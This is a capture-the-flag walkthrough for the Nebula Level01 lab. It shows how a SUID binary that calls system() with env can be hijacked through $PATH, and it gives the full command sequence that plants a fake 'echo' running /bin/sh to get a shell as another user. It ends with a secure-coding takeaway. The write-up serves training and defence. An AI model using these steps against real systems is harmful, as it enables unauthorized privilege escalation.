## 🧪 Nebula - Level01

> **Category:** Privilege Escalation – `$PATH` Hijacking
> 
> **Goal:** Gain a shell as `flag01`
> 
> **System:** GNU/Linux – Nebula VM
> 
> **Required skills:** Environment variable manipulation, understanding of `system()` and `/usr/bin/env`

---

### 🔍 Description

This level presents a **SUID binary** owned by `flag01`, accessible by the current user `level01`. Static analysis of the binary reveals that it uses `system("/usr/bin/env echo and now what?")`, which is exploitable via `$PATH` manipulation.

---

### 📂 Finding the vulnerable binary

We navigate to the target user's home directory:

```bash
cd /home/flag01
ls -l
```

We find the vulnerable binary:

```
-rwsr-x--- 1 flag01 level01 7322 ... flag01
```

This binary runs with `flag01`'s privileges due to the **SUID bit**.

---

### 🔎 Binary analysis using `gdb`

Using `gdb`, we disassemble the main function:

```bash
gdb ./flag01
(gdb) disas main
```

Key instructions:

```asm
call   setresgid
call   setresuid
call   system
```

It calls:

```c
system("/usr/bin/env echo and now what?");
```

---

### 🚩 Vulnerability explained

The binary executes `env`, which **looks up `echo` in the current `$PATH`**.

If we create a **malicious fake `echo`** somewhere early in our `$PATH`, we can hijack the execution.

---

### 🚀 Exploitation steps

1. **Create a fake `echo`:**

```bash
echo "/bin/sh" > /tmp/echo
chmod +x /tmp/echo
```

2. **Inject our path into `$PATH`:**

```bash
export PATH=/tmp:$PATH
```

3. **Run the vulnerable binary:**

```bash
./flag01
```

Success: we get a shell as `flag01`.

4. **Retrieve the flag:**

```bash
getflag
```

---

### ✅ Full exploit summary

```bash
echo "/bin/sh" > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./flag01
getflag
```

---

### 🔐 Security takeaway

This level teaches us how dangerous it is to use `system()` in **SUID binaries**, especially with `env`, which relies on the environment for command resolution.

Even though the full path to `env` is specified, the argument (`echo`) is resolved via `$PATH`, and is therefore **user-controllable**.

> 🔥 Never trust `$PATH` in privileged programs. Always use absolute paths and drop privileges where possible.

---